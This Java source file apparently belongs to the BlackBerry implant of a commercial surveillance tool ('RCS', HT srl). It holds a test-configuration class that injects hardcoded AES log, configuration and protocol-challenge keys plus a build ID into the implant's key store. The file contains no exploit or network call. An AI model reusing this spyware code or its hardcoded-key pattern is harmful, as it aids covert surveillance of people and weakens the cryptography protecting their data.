//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.config
 * File         : InstanceKeys323.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.config;

// TODO: Auto-generated Javadoc
/**
 * The Class InstanceKeys323.
 */

public final class InstanceKeysFake implements InstanceKeysEmbedded {
    //#ifdef FAKECONF
    // RCS 1
    byte[] logKey = new byte[] { (byte) 0x14, (byte) 0xe7, (byte) 0xff,
            (byte) 0xc9, (byte) 0xa2, (byte) 0x9a, (byte) 0xb4, (byte) 0xcf,
            (byte) 0x93, (byte) 0xd7, (byte) 0x38, (byte) 0xd8, (byte) 0xa8,
            (byte) 0x99, (byte) 0x9d, (byte) 0xc4 };
    byte[] confKey = new byte[] { (byte) 0xea, (byte) 0xaf, (byte) 0xf5,
            (byte) 0xd4, (byte) 0xca, (byte) 0x87, (byte) 0x91, (byte) 0x14,
            (byte) 0xe2, (byte) 0x5a, (byte) 0x65, (byte) 0xe0, (byte) 0x49,
            (byte) 0x0b, (byte) 0x02, (byte) 0x28 };
    byte[] protoKey = new byte[] { (byte) 0x7c, (byte) 0xe6, (byte) 0x62,
            (byte) 0x59, (byte) 0xec, (byte) 0xe1, (byte) 0x0d, (byte) 0x5b,
            (byte) 0xf6, (byte) 0x76, (byte) 0x8c, (byte) 0x20, (byte) 0x0b,
            (byte) 0x3f, (byte) 0xe1, (byte) 0x27 };

    /**
     * Inject keysFake.
     */
    public void injectKeys(InstanceKeys keys) {
        keys.setAesKey(logKey);
        keys.setChallengeKey(protoKey);
        keys.setBuildID("RCS_0000000001");
        keys.setConfKey(confKey);
    }

    public InstanceKeysFake() {
    }

    //#else
    public void injectKeys(InstanceKeys keys) {
    }
    //#endif
}
